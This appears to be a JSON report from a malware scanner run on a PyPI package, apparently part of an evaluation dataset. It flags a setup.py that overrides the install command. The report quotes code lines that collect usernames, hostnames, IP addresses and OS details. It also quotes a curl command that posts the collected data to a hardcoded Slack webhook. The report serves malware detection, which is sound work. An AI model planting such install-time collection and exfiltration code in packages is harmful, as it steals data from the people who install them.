{
  "package_name": "kings_landing_obfuscate-1.1.0",
  "total_matches": 19,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
      "file_name": "setup.py",
      "detection_count": 19,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is malicious. It overrides the setuptools install command to execute code during package installation. It collects sensitive system information, including the current working directory, OS details, local and public IP addresses, username, and hostname. It then exfiltrates this data by sending it to a hardcoded Slack webhook URL using a curl command. This behavior is typical of information-stealing malware and is not appropriate for legitimate package installation scripts.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "19",
          "type_description": "shady-links: found 3 source code matches",
          "code_snippet": "public_ip=os.popen('curl ifconfig.me').read()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at kings_landing_obfuscate-1.1.0/setup.py:19",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "24",
          "type_description": "shady-links: found 3 source code matches",
          "code_snippet": "public_ip=os.popen('curl ifconfig.me').read()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at kings_landing_obfuscate-1.1.0/setup.py:24",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "36",
          "type_description": "shady-links: found 3 source code matches",
          "code_snippet": "public_ip=os.popen('curl ifconfig.me').read()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at kings_landing_obfuscate-1.1.0/setup.py:36",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "49",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(name='kings_landing_obfuscate', version='1.1.0',description='test',author='test',license='MIT',zip_safe=False,cmdclass={'install': CustomInstall})",
          "full_match": "* This package is overwriting the 'install' command in setup.py at kings_landing_obfuscate-1.1.0/setup.py:49",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "16",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "conf=os.popen('uname -a').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:16",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "18",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "ip=os.popen('ifconfig').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:18",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "19",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "public_ip=os.popen('curl ifconfig.me').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:19",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "21",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "conf=os.popen('uname -a').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:21",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "23",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "ip=os.popen('ifconfig').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:23",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "24",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "public_ip=os.popen('curl ifconfig.me').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:24",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "27",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "conf=os.popen('systeminfo').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:27",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "29",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "ip=os.popen('ipconfig').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:29",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "30",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "public_ip=os.popen('tasklist').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:30",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "33",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "conf=os.popen('uname -a').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:33",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "35",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "ip=os.popen('ifconfig').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:35",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "36",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "public_ip=os.popen('curl ifconfig.me').read()",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:36",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "41",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "who=(os.popen('whoami').read())",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:41",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "43",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "hostn=(os.popen('hostname').read())",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:43",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        },
        {
          "line_number": "45",
          "type_description": "code-execution: found 15 source code matches",
          "code_snippet": "os.system('curl -X POST -H \\'Content-type: application/json\\' --data \\'{\\\"text\\\": \\\"FILE_NAME: %s HOSTNAME: %s WHOAMI: %s PUBLIC_IP: %s PWD: %s OS_INFO: %s IP: %s\\\"}\\' https://hooks.slack.com/services/T2E5GPUPK/B03R6UP1HPY/pZS0vEzptS81dER...onf,ip))",
          "full_match": "* This package is executing OS commands in the setup.py file at kings_landing_obfuscate-1.1.0/setup.py:45",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/kings_landing_obfuscate-1.1.0/kings_landing_obfuscate-1.1.0/setup.py",
          "relative_path": "kings_landing_obfuscate-1.1.0/setup.py"
        }
      ]
    }
  ]
}